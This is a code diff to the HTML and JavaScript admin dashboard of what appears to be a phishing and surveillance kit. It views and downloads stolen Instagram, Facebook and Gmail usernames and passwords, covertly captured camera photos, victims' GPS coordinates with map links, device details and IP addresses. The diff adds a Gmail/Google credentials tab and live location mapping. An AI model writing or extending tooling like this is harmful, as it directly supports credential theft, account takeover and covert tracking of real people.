@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Admin Panel - Collected Data Viewer</title>
+    <title>Secure Admin Panel - Live Data Viewer</title>
     <style>
         :root {
             --bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
@@ -113,7 +113,7 @@
         #dashboardContainer {
             display: none;
             width: 100%;
-            max-width: 1100px;
+            max-width: 1150px;
             padding: 30px;
             box-sizing: border-box;
         }
@@ -193,11 +193,11 @@
             width: 100%;
             border-collapse: collapse;
             color: #fff;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
         }
 
         th, td {
-            padding: 12px;
+            padding: 12px 10px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             text-align: left;
         }
@@ -205,14 +205,46 @@
         th {
             color: #ff758c;
             background: rgba(0, 0, 0, 0.3);
+            white-space: nowrap;
+        }
+
+        .record-id {
+            font-family: monospace;
+            color: #38bdf8;
+            font-weight: bold;
         }
 
         .preview-img {
-            max-width: 100px;
-            max-height: 100px;
+            max-width: 80px;
+            max-height: 80px;
             border-radius: 6px;
             object-fit: cover;
             border: 1px solid var(--glass-border);
+        }
+
+        .device-info-box {
+            font-size: 0.75rem;
+            color: #cbd5e1;
+            line-height: 1.4;
+            max-width: 220px;
+            word-break: break-word;
+        }
+
+        .map-link {
+            background: linear-gradient(135deg, #00b4d8, #0077b6);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: inline-block;
+            box-shadow: 0 2px 10px rgba(0, 180, 216, 0.3);
+            white-space: nowrap;
+        }
+
+        .map-link:hover {
+            opacity: 0.9;
         }
 
         .action-bar {
@@ -267,9 +299,10 @@
         <!-- Category Navigation Tabs -->
         <div class="tabs">
             <button class="tab-btn active" data-target="instagram" onclick="switchTab('instagram')">📸 Instagram Logs</button>
+            <button class="tab-btn" data-target="gmail" onclick="switchTab('gmail')">✉️ Gmail / Google Logs</button>
             <button class="tab-btn" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Logs</button>
             <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Photos</button>
-            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Data</button>
+            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Live Location Map</button>
         </div>
 
         <!-- 1. INSTAGRAM TAB -->
@@ -280,7 +313,15 @@
             </div>
         </div>
 
-        <!-- 2. FACEBOOK TAB -->
+        <!-- 2. GMAIL / GOOGLE TAB -->
+        <div id="gmail-section" class="tab-content">
+            <div class="viewer-screen" id="gmailViewer">Loading Gmail records...</div>
+            <div class="action-bar">
+                <button class="btn-download" onclick="downloadJSON('gmail')">📥 Download Gmail JSON</button>
+            </div>
+        </div>
+
+        <!-- 3. FACEBOOK TAB -->
         <div id="facebook-section" class="tab-content">
             <div class="viewer-screen" id="facebookViewer">Loading Facebook records...</div>
             <div class="action-bar">
@@ -288,7 +329,7 @@
             </div>
         </div>
 
-        <!-- 3. CAMERA TAB -->
+        <!-- 4. CAMERA TAB -->
         <div id="camera-section" class="tab-content">
             <div class="viewer-screen" id="cameraViewer">Loading camera media...</div>
             <div class="action-bar">
@@ -296,7 +337,7 @@
             </div>
         </div>
 
-        <!-- 4. LOCATION TAB -->
+        <!-- 5. LOCATION MAP TAB -->
         <div id="location-section" class="tab-content">
             <div class="viewer-screen" id="locationViewer">Loading location tracking logs...</div>
             <div class="action-bar">
@@ -319,7 +360,6 @@
             const pass = document.getElementById("passwordInput").value.trim();
             const errorMsg = document.getElementById("errorMsg");
 
-            // Server-side authentication API call
             fetch('/api/admin-login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -358,7 +398,6 @@
             document.getElementById(`${category}-section`).classList.add('active');
         }
 
-        // Server se data fetch karna
         function fetchLogsFromServer() {
             fetch('/api/get-logs')
                 .then(res => res.json())
@@ -370,16 +409,27 @@
         }
 
         function renderTables() {
-            // Filter data based on platform or fields for Instagram and Facebook
-            const instaLogs = allLogs.filter(log => (log.platform && log.platform.toLowerCase().includes('instagram')) || (log.instagram_username && log.instagram_username !== 'N/A'));
+            const instaLogs = allLogs.filter(log => (log.platform && log.platform.toLowerCase().includes('instagram')) || (log.instagram_username && log.instagram_username !== 'N/A' && !log.platform?.toLowerCase().includes('gmail') && !log.platform?.toLowerCase().includes('google')));
+            const gmailLogs = allLogs.filter(log => (log.platform && (log.platform.toLowerCase().includes('gmail') || log.platform.toLowerCase().includes('google'))));
             const fbLogs = allLogs.filter(log => log.platform && log.platform.toLowerCase().includes('facebook'));
             const camLogs = allLogs.filter(log => log.image_base64 && log.image_base64 !== null);
             const locLogs = allLogs.filter(log => log.location && log.location.latitude && log.location.latitude !== 'N/A');
 
             populateTable('instagramViewer', instaLogs, 'Instagram');
+            populateTable('gmailViewer', gmailLogs, 'Gmail');
             populateTable('facebookViewer', fbLogs, 'Facebook');
             populateTable('cameraViewer', camLogs, 'Camera');
             populateTable('locationViewer', locLogs, 'Location');
+        }
+
+        function formatSystemInfo(sys) {
+            if (!sys || Object.keys(sys).length === 0) return 'N/A';
+            let info = [];
+            if (sys.platform) info.push(`OS: ${sys.platform}`);
+            if (sys.browser) info.push(`Browser: ${sys.browser}`);
+            if (sys.deviceMemory) info.push(`RAM: ${sys.deviceMemory}GB`);
+            if (sys.screenResolution) info.push(`Screen: ${sys.screenResolution}`);
+            return info.length > 0 ? info.join('<br>') : JSON.stringify(sys);
         }
 
         function populateTable(containerId, logs, type) {
@@ -390,23 +440,26 @@
                 return;
             }
 
-            let html = `<table><thead><tr><th>Time</th>`;
-            if (type === 'Instagram' || type === 'Facebook') {
-                html += `<th>Username / Email</th><th>Password</th>`;
+            let html = `<table><thead><tr><th>ID</th><th>Time</th>`;
+            if (type === 'Instagram' || type === 'Facebook' || type === 'Gmail') {
+                html += `<th>Username / Email</th><th>Password / Token</th>`;
             }
             if (type === 'Camera') {
                 html += `<th>Captured Image</th>`;
             }
             if (type === 'Location') {
-                html += `<th>Latitude</th><th>Longitude</th>`;
+                html += `<th>Latitude</th><th>Longitude</th><th>Live Map</th>`;
             }
-            html += `<th>IP Address</th></tr></thead><tbody>`;
+            html += `<th>Device Info</th><th>IP Address</th></tr></thead><tbody>`;
 
             logs.forEach(log => {
+                let recordId = log.id || 'N/A';
                 let timeStr = new Date(log.timestamp).toLocaleString();
-                html += `<tr><td>${timeStr}</td>`;
+                let sysInfo = formatSystemInfo(log.system);
+
+                html += `<tr><td class="record-id">${recordId}</td><td>${timeStr}</td>`;
                 
-                if (type === 'Instagram' || type === 'Facebook') {
+                if (type === 'Instagram' || type === 'Facebook' || type === 'Gmail') {
                     html += `<td>${log.instagram_username || 'N/A'}</td><td><span style="color:#ff758c; font-weight:bold;">${log.instagram_password || 'N/A'}</span></td>`;
                 }
                 if (type === 'Camera') {
@@ -414,20 +467,25 @@
                     html += `<td>${imgTag}</td>`;
                 }
                 if (type === 'Location') {
-                    html += `<td>${log.location ? log.location.latitude : 'N/A'}</td><td>${log.location ? log.location.longitude : 'N/A'}</td>`;
+                    let lat = log.location ? log.location.latitude : 'N/A';
+                    let lon = log.location ? log.location.longitude : 'N/A';
+                    let mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    html += `<td>${lat}</td><td>${lon}</td><td><a href="${mapUrl}" target="_blank" class="map-link">🗺️ Open Map</a></td>`;
                 }
-                html += `<td>${log.ip || 'N/A'}</td></tr>`;
+
+                html += `<td><div class="device-info-box">${sysInfo}</div></td><td>${log.ip || 'N/A'}</td></tr>`;
             });
 
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
 
-        // Category-wise JSON Download
         function downloadJSON(category) {
             let targetData = allLogs;
             if (category === 'instagram') {
                 targetData = allLogs.filter(log => (log.platform && log.platform.toLowerCase().includes('instagram')) || (log.instagram_username && log.instagram_username !== 'N/A'));
+            } else if (category === 'gmail') {
+                targetData = allLogs.filter(log => log.platform && (log.platform.toLowerCase().includes('gmail') || log.platform.toLowerCase().includes('google')));
             } else if (category === 'facebook') {
                 targetData = allLogs.filter(log => log.platform && log.platform.toLowerCase().includes('facebook'));
             } else if (category === 'camera') {
